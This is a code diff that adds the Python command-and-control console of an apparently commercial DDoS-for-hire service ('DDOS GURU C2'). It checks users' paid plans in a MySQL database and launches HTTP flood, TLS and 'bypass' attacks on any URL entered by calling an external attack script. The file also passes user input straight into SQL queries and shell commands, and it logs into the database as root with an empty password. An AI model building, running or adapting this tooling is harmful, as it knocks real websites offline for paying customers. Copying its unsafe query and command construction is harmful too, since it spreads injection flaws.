@@ -1,0 +1,201 @@
+import os
+import subprocess
+import sys
+import getpass
+import mysql.connector
+from colorama import Back, Style, Fore
+import readline
+
+mydb = mysql.connector.connect(
+    host="localhost",
+    user="root",
+    password="",
+    database="ddosguru",
+    auth_plugin='mysql_native_password'
+)
+
+mycursor = mydb.cursor()
+username = getpass.getuser()
+
+mycursor.execute(f"SELECT * FROM `users` WHERE `username`='{username}'")
+user_details = mycursor.fetchone()
+try:
+    [user_id, user_name, user_pass, user_plan, user_reg,
+     user_expiry, user_paid, user_months, user_running] = user_details
+except:
+    quit(f"{Fore.RED}\n?        User Removed/Banned!\n")
+
+mycursor.execute(f"SELECT * FROM `plans` WHERE `name`='{user_plan}'")
+
+plan_details = mycursor.fetchone()
+
+[plan_id, plan_name, plan_concs, plan_time,
+    plan_amount, plan_threads] = plan_details
+
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
+def si():
+    print(
+        Style.BRIGHT+Fore.MAGENTA+f'[ {username.upper()} ] ---?  {Back.BLUE+Fore.WHITE} Plan : {user_plan} {Back.RESET} {Back.BLUE} Expiry : {user_expiry} {Back.RESET} {Back.BLUE} Concs : {plan_concs} {Back.RESET} {Back.BLUE} BootTime : {plan_time}s {Back.RESET}')
+    print("")
+
+
+def layer7():
+    clear()
+    si()
+    print(Fore.RED+f'''
+                              +---------------+
+                              ¦    Layer 7    ¦
+               +---------------------------------------------+
+               ¦   http-flood          ¦   killer            ¦
+               ¦   http-tls            ¦   <empty>           ¦
+               +---------------------------------------------+
+''')
+
+
+def layer4():
+    clear()
+    si()
+    print(Fore.RED+f'''
+                              +---------------+
+                              ¦    Layer 4    ¦
+               +---------------------------------------------+
+               ¦   <empty>             ¦   <empty>           ¦
+               ¦   <empty>             ¦   <empty>           ¦
+               ¦   <empty>             ¦   <empty>           ¦
+               ¦   <empty>             ¦   <empty>           ¦
+               +---------------------------------------------+
+''')
+
+
+def getUserRunningTime():
+    global username
+    global mycursor
+    res = subprocess.run(f"php /home/ddosguru/current-time.php {username}", shell=True, capture_output=True)
+    user_running_time = res.stdout.decode()
+    user_running_time = int(user_running_time)
+    return user_running_time
+
+
+def menu():
+    global username
+    sys.stdout.write(
+        f"\x1b]2;DDOS GURU C2 --> | Online Users: [1] | Expiry Date : {user_expiry} | Plan : {user_plan}\x07")
+    clear()
+    si()
+    print(f"""{Fore.BLUE}                                             
+         _____  _____   ____   _____    _____ _    _ _____  _    _                      
+        |  __ \|  __ \ / __ \ / ____|  / ____| |  | |  __ \| |  | |             
+        | |  | | |  | | |  | | (___   | |  __| |  | | |__) | |  | |             
+        | |  | | |  | | |  | |\___ \  | | |_ | |  | |  _  /| |  | |             
+        | |__| | |__| | |__| |____) | | |__| | |__| | | \ \| |__| |             
+        |_____/|_____/ \____/|_____/   \_____|\____/|_|  \_\\______/                  
+                                  {Fore.RED}  C 2                                               {Style.RESET_ALL} """)
+    print(Fore.YELLOW+"""                                                                                       
+           +------------------------------------------------+
+           ¦ WELCOME TO DDOS-GURU-C2 | Telegram: @ddos_guru ¦
+           +------------------------------------------------+
+            +----------------------------------------------+
+            ¦   Type [help] to see the DDOS-GURU commands  ¦
+            +----------------------------------------------+
+            
+""")
+
+
+def l7_method(cnc, method_type):
+    global plan_concs
+    global username
+    method = cnc.split()[0]
+    try:
+        [method, url, time, reqs, conc] = cnc.split()
+        running_time = getUserRunningTime()
+        if (running_time > 1):
+            print()
+            print(
+                Fore.RED+f'?   Error: Attack is already running ==> Wait for : {running_time} Secs!')
+            print()
+            return
+
+        if (int(time) > plan_time):
+            print()
+            print(
+                Fore.RED+f'?   Error: Your Max Time Usage : {plan_time} Secs!')
+            print()
+            return
+        if (int(conc) > plan_concs):
+            print()
+            print(
+                Fore.RED+f'?   Error: Your Max Concs Usage : {plan_concs} Concs!')
+            print()
+            return
+        print()
+        res = os.system(
+            f'node /home/ddosguru/attack.js {url} {time} {conc} {reqs} {plan_threads} Guru.txt {method_type} {username}')
+        os.system(f'nohup php /home/ddosguru/time-changer.php {username} {time} > /dev/null 2>&1 &')
+        print()
+        return
+    except ValueError:
+        print(
+            f'?     Usage: {method} <url> <time> <reqs> <conc<={plan_concs}>')
+        print(
+            f'?     Example: {method} http://example.com 60 64 {plan_concs}')
+
+
+def main():
+    menu()
+    global username
+    while (True):
+        try:
+            cnc = input(
+                Fore.WHITE+f'{Back.GREEN+Style.BRIGHT+" "+username+" "+Style.RESET_ALL+Back.RESET+Fore.RED} >> DDOSGURU ---?  '+Fore.YELLOW)
+        except KeyboardInterrupt:
+            print("")
+            continue
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+            layer7()
+        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
+            layer4()
+        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+            main()
+
+        elif "http-flood" in cnc:
+            l7_method(cnc, "flood")
+
+        elif "killer" in cnc:
+            l7_method(cnc, "bypass")
+
+        elif "http-tls" in cnc:
+            l7_method(cnc, "tls")
+
+        elif "exit" == cnc or cnc == "EXIT":
+            print(Fore.RESET+Style.RESET_ALL)
+            quit(1)
+
+        elif "help" in cnc:
+            print(Fore.RED+f'''
+                                -------------------------------------
+                        +--------------------------------------------------+
+             +------------------------------------------------------------------------+
+             ¦  layer7             ¦  ¦  exit               ¦   ¦  <empty>            ¦
+             ¦  layer4             ¦  ¦  <empty>            ¦   ¦  <empty>            ¦
+             ¦  cls                ¦  ¦  <empty>            ¦   ¦  <empty>            ¦
+             +------------------------------------------------------------------------+
+
+            ''')
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+
+def login():
+    clear()
+    main()
+
+
+login()
